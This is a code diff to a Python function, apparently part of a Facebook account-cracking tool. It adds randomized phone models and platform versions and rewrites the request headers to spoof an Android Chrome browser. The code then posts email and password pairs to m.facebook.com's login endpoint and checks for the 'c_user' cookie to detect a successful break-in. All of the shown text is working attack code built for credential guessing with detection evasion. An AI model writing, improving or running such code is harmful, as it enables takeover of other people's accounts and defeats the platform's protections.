@@ -2504,6 +2504,11 @@ def m6(idf,pw):
     'Chrome/109.0.5414.74', 'Chrome/110.0.5481.77', 'Chrome/111.0.5563.111', 'Chrome/112.0.5615.138',
     'Chrome/113.0.5672.126', 'Chrome/114.0.5735.90', 'Chrome/115.0.5790.110', 'Chrome/116.0.5845.97',
     'Chrome/117.0.5938.92', 'Chrome/118.0.5989.110', 'Chrome/119.0.6053.81', 'Chrome/120.0.6110.72']
+   sec_ch_ua_models = [
+    '23076PC4BI', 'Pixel 4', 'Pixel 5', 'Pixel 6', 'SM-G998B', 'SM-G991B', 'SM-G996B', 'SM-A505FN',
+    'SM-A705FN', 'SM-N986B', 'SM-N981B', 'SM-F916B', 'SM-F926B']
+   sec_ch_ua_platform_version = [
+    '10.0.0', '11.0.0', '12.0.0', '13.0.0', '14.0.0', '15.0.0', '16.0.0', '17.0.0']
                         # Assemble the User-Agent string
    user_agent2 = ';'.join(random.choice(part) for part in [fban_fb4a, fbav, fbbv, fban_fb4a, fbav, fbbv, fbdm, fblc, fbrv, fbcr, fbmf, fbbd, fbpn, fbdv, fbsv, fbop, fbca])
    user_agent = (
@@ -2525,21 +2530,27 @@ def m6(idf,pw):
             "email":idf,
             "pass":ps,
             "login":"Log In"}
-   header_freefb = {
-    'User-Agent': user_agent,
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Connection': 'keep-alive',
-    'Upgrade-Insecure-Requests': '1',
-    'Sec-Fetch-Dest': 'document',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-User': '?1',
-    'DNT': '1',  # Do Not Track Request Header
-    'Referer': 'https://m.facebook.com/',
-    'Origin': 'https://m.facebook.com',
-    'TE': 'Trailers',}
+   header_freefb ={
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.200000047683716',
+    'referer': 'https://m.facebook.com/nt/screen/?params=%7B%22phase%22%3A%22unauthenticated%22%2C%22step%22%3A%22intro%22%2C%22is_eligible_for_challenges%22%3Atrue%7D&path=%2Fnt%2Fcheckpoint%2F828281030927956%2Fhelp_modal&state',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': f'"{random.choice(sec_ch_ua_models)}"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"14.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': user_agent,
+    'viewport-width': '980',}
    lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
